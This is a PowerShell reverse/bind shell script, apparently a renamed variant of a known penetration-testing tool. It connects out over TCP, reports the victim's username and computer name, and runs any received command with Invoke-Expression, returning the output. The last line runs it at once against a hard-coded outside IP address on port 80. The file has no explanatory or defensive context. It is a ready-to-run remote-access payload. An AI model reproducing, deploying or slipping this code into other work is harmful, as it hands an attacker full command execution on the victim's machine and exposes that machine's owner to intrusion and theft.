function Invoke-PowerShellTcp 
{ 
      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        
        if ($Reverse)
        {
            $GFSworkstation = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        
        if ($Bind)
        {
            $ears = [System.Net.Sockets.TcpListener]$Port
            $ears.start()    
            $GFSworkstation = $ears.AcceptTcpClient()
        } 

        $river = $GFSworkstation.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        
        $sendbytes = ([text.encoding]::ASCII).GetBytes("User: " + $env:username + " Workstation " + $env:computername + "`n`n")
        $river.Write($sendbytes,0,$sendbytes.Length)

        
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $river.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $river.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $ET = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $ET.GetString($bytes,0, $i)
            try
            {
                
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong!" 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $river.Write($sendbyte,0,$sendbyte.Length)
            $river.Flush()  
        }
        $GFSworkstation.Close()
        if ($ears)
        {
            $ears.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong!" 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -reverse -IPAddress 54.201.69.247 -Port 80